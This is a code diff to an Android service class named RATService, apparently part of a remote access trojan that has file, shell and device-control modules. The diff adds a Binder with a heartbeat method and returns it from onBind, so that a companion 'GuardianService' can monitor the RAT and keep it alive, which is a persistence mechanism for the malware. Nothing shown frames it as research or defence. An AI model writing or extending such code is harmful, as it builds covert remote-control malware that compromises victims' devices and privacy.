@@ -8,8 +8,10 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Binder;
 import android.os.Build;
 import android.os.IBinder;
+import android.os.RemoteException;
 import android.os.SystemClock;
 import androidx.core.app.NotificationCompat;
 
@@ -40,6 +42,17 @@ public class RATService extends Service {
     private FileModule fileModule;
     private ShellModule shellModule;
     private DeviceModule deviceModule;
+    
+    // Binder for GuardianService communication
+    public class RATServiceBinder extends Binder {
+        public void heartbeat() throws RemoteException {
+            if (!isRunning) {
+                throw new RemoteException("Service is not running");
+            }
+        }
+    }
+    
+    private final RATServiceBinder binder = new RATServiceBinder();
     
     @Override
     public void onCreate() {
@@ -256,7 +269,7 @@ public class RATService extends Service {
     
     @Override
     public IBinder onBind(Intent intent) {
-        return null;
+        return binder; // Return binder for GuardianService connection
     }
     
     @Override
